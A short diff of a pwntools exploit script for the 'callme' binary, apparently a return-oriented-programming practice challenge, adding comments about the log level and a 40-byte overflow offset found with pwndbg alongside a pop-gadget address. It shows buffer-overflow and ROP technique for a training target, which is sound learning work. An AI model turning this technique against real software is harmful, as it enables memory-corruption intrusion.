@@ -134,9 +134,9 @@ from pwn import *
 
 elf = context.binary = ELF('./callme', checksec=False)
 p = process()
-context.log_level = 'info'
+context.log_level = 'info' # i put it in debug mode for when testing
 
-offset = b'a' * 40
+offset = b'a' * 40 # found with pwndbg
 
 # pop rdi; pop rsi; pop rdx; ret;
 pop_gadgets = 0x40093c
